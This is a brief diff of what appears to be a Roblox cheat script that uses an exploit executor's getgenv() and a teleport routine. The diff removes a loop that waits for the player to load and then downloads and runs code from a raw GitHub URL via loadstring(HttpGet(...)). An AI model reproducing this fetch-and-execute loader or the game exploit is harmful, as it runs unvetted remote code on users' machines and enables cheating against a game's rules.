@@ -112,16 +112,3 @@ if isNearFairyCastle then
 	teleport()
 end
 
-
-local G = getgenv()
-G.Ver = true
-
-while G.Ver do
-	wait()
-	print("Tentando Executar!")
-	if game.Players.LocalPlayer:GetAttribute("__LOADED") == true then
-		print("Executado!")
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/LDSHUBscripts/scripts/main/ignore'))()
-		G.Ver = false	
-	end
-end
